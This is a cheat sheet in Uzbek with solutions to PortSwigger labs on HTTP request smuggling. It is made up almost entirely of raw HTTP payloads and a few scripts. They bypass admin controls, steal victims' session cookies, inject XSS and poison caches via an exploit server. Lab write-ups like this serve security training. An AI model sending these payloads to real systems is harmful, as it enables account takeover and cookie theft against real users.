# HTTP Request Smuggling — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Umumiy qoida: so'rovni **ikki marta** jo'natasan (2-si smuggled prefiksni ko'taradi).
> HTTP/1 kerak bo'lsa Burp Inspector → Request attributes → protocol'ni HTTP/1 ga o'tkaz.
> CL.TE/TE.CL'da Repeater menu → **"Update Content-Length" ni OFF** qil. Oxirgi `0` dan keyin
> `\r\n\r\n` bo'lishi SHART. Chunk o'lchamlari (`5c`, `60`...) = smuggled body baytlari (hex).
> `HTTP Request Smuggler` (BApp) chunk/Content-Length'ni avtomat to'g'rilaydi.

---

## Asoslar (CL.TE / TE.CL)

### Basic CL.TE — PRACTITIONER
Front-end `Content-Length`, back-end `Transfer-Encoding` o'qiydi.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
> 2-javob: "Unrecognized method GPOST". Body = `0\r\n\r\nG` (6 bayt).

### Basic TE.CL — PRACTITIONER
Front-end `Transfer-Encoding`, back-end `Content-Length`.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Obfuscating the TE header — PRACTITIONER
Ikki `Transfer-Encoding` header — biri obfuscated (`cow`), front/back har xil parse qiladi.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

---

## Topish (differential responses)

### Confirming CL.TE — PRACTITIONER
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
> 2-so'rov 404 olsa — CL.TE tasdiq.

### Confirming TE.CL — PRACTITIONER
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

---

## Exploiting (classic)

### Bypass front-end controls, CL.TE — PRACTITIONER
Smuggled `GET /admin` ga `Host: localhost` qo'yib front-end blокini aylanasan.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### Bypass front-end controls, TE.CL — PRACTITIONER
```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Reveal front-end request rewriting — PRACTITIONER
Front-end qo'shadigan yashirin header nomini (`X-abcdef-Ip`) search reflection orqali ochasan.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
Topilgan header bilan admin:
```http
0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Capture other users' requests — PRACTITIONER
Katta `Content-Length` (400) bilan victim so'rovini comment sifatida saqlaysan.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION; csrf=YOUR-CSRF

csrf=YOUR-CSRF&postId=5&name=x&email=x%40x.net&website=&comment=
```
> `comment` ni oxirgi parametr qil. CL ni asta oshir — to'liq cookie tushguncha.

### Deliver reflected XSS — PRACTITIONER
`User-Agent` yashirin inputga reflect bo'ladi → smuggled so'rovga XSS User-Agent.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### Web cache poisoning — PRACTITIONER
Smuggled `GET /post/next?postId=3` → redirect Host'ni exploit serverga. `/post` da
`alert(document.cookie)` (text/javascript) joylaysan.
```http
0

GET /post/next?postId=3 HTTP/1.1
Host: exploit.example.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
> Keyin `GET /resources/js/tracking.js` → cache poisoned redirect.

### Web cache deception — PRACTITIONER
Smuggled `GET /my-account` → victim API key static resource sifatida cache'lanadi.
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

---

## Advanced (HTTP/2)

### H2.CL — PRACTITIONER
Front-end HTTP/2 ni downgrade qiladi, soxta `Content-Length: 0` ni ishonadi.
```
POST / HTTP/2
Host: example.com
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit.example.net
Content-Length: 5

x=1
```
> `/resources` redirect gadget. Exploit server `/resources` da `alert(document.cookie)`.

### H2.TE response queue poisoning — EXPERT
HTTP/2 + `Transfer-Encoding: chunked` → to'liq smuggled so'rov → response queue poison →
admin 302 javobini (session cookie) ushlaysan.
```
POST /x HTTP/2
Host: example.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: example.com
```
> 5s kut → normal so'rov qayta jo'nat → 404'dan boshqa javob = admin javobi (302 + session).

### H2 request smuggling via CRLF injection — EXPERT
HTTP/2 header value'ga CRLF inject → downgrade'da `Transfer-Encoding` qo'shiladi.
```
Header name:  foo
Header value: bar\r\nTransfer-Encoding: chunked      (newline = Shift+Return)
Body:
0

POST / HTTP/1.1
Host: example.com
Cookie: session=YOUR-SESSION
Content-Length: 800

search=x
```
> Victim `GET` so'rovi (session cookie bilan) recent searches'da chiqadi.

### H2 request splitting via CRLF — EXPERT
Header value CRLF bilan to'liq 2-so'rovni yasaysan → admin 302 javobini ushlaysan.
```
Header name:  foo
Header value: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: example.com
```
> 5s kut → qayta jo'nat → 302 = admin session cookie → `GET /admin` o'sha cookie bilan.

### Bypass access controls via H2 request tunnelling — EXPERT
Header NAME'ga CRLF inject → front-end auth header'larini (`X-SSL-VERIFIED`, `X-SSL-CLIENT-CN`,
`X-FRONTEND-KEY`) leak qilib, `/admin` ga soxta qiymat bilan tunnel qilasan.
```
foo: bar\r\nContent-Length: 500\r\n\r\nsearch=x        ← header'larni leak qil
foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: YOUR-KEY\r\n\r\n
```
> `:path` ni `/login` (qisqa javob) qil, keyin `/admin/delete?username=carlos`.

### Web cache poisoning via H2 request tunnelling — EXPERT
`HEAD` method + tunnelled so'rov → javobni cache'ga poison. XSS gadget:
```
:path = /?cachebuster=3 HTTP/1.1\r\nHost: example.com\r\n\r\nGET /resources?<script>alert(1)</script> HTTP/1.1\r\nFoo: bar
```
> `</script>` dan keyin padding qo'sh (tunnelled javob normal CL'dan uzun bo'lsin).

---

## Browser-powered (desync)

### CL.0 request smuggling — EXPERT
Static endpoint (`/resources/images/blog.svg`) `Content-Length` ni e'tiborsiz qoldiradi.
```http
POST /resources/images/blog.svg HTTP/1.1
Host: example.com
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Length: <to'g'ri>

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```
> Repeater'da 2 tab group → "send in sequence over single connection".

### Client-side desync — EXPERT
`GET /` → `/en` redirect; server POST body'ni o'qimaydi. Browser `fetch()` bilan desync
qilib, victim cookie'ni comment'ga yozasan. Exploit (exploit server'da `<script>`):
```js
fetch('https://example.com/en', {method:'POST', body:"GET /capture-me HTTP/1.1\r\nFoo: x", mode:'no-cors', credentials:'include'})
  .catch(()=>{ fetch('https://example.com/en/post/comment', {mode:'no-cors', credentials:'include'}) })
```
> Nested `Content-Length` ni sozlab victim `session` cookie comment'ga tushguncha.

### Server-side pause-based request smuggling — EXPERT
Apache 2.4.52, redirect endpoint'da pause-based CL.0. Turbo Intruder kerak (pause yuboradi).
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           requestsPerConnection=500, pipeline=False)
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)
def handleResponse(req, interesting):
    table.add(req)
```
```http
POST /resources HTTP/1.1
Host: example.com
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <to'g'ri>

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: <to'g'ri>

csrf=YOUR-CSRF&username=carlos
```
> So'nggi pauseMarker = `['Content-Length: CORRECT\r\n\r\n']` (faqat 1-header blokiga mos).

### 0.CL request smuggling — EXPERT
Front-end `Content-Length` ni e'tiborsiz (0 deb) qoldiradi, back-end o'qiydi — H2.CL ning teskarisi.
PortSwigger yechimi faqat video (James Kettle, "HTTP/1.1 Must Die" whitepaper). Maqsad: carlos
browserида (har 5s bosh sahifa) `alert()`. Texnika 0.CL desync + redirect gadget orqali
JS import'ni poison qilish — H2.CL labidagi `/resources` gadget mantiqi bilan bir xil.

---

### Eslatma
Topish: `HTTP Request Smuggler` (BApp) "Smuggle probe". Himoya: front/back bir xil HTTP parser,
HTTP/2 end-to-end (downgrade yo'q), ambiguous length so'rovni rad et. Umumiy: bu papka README.
